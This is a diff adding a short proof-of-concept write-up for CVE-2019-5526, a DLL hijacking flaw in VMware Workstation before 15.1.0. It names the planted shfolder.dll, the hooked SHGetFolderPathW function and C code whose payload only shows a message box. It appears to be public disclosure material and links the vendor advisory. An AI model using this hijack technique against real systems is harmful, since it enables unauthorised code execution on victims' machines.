@@ -1,0 +1,34 @@
+#---------------------------------------------------------
+# Title: VMware Workstation DLL hijacking < 15.1.0
+# Date: 2019-05-14
+# Author: Miguel Mendez Z. & Claudio Cortes C.
+# Team: www.exploiting.cl
+# Vendor: https://www.vmware.com
+# Version: VMware Workstation Pro / Player (Workstation)
+# Tested on: Windows Windows 7_x86/7_x64 [eng]
+# Cve: CVE-2019-5526
+#---------------------------------------------------------
+
+
+Description:
+
+VMware Workstation contains a DLL hijacking issue because some DLL.
+
+
+DLL Hijacking: shfolder.dll
+Hooking: SHGetFolderPathW()
+
+------Code_Poc-------
+#include "dll.h"
+#include <windows.h>
+
+DLLIMPORT void SHGetFolderPathW()
+{
+MessageBox(0, "s1kr10s", "VMWare-Poc", MB_ICONINFORMATION);
+exit(0);
+}
+
+--------------------------
+
+
+https://www.vmware.com/security/advisories/VMSA-2019-0007.html
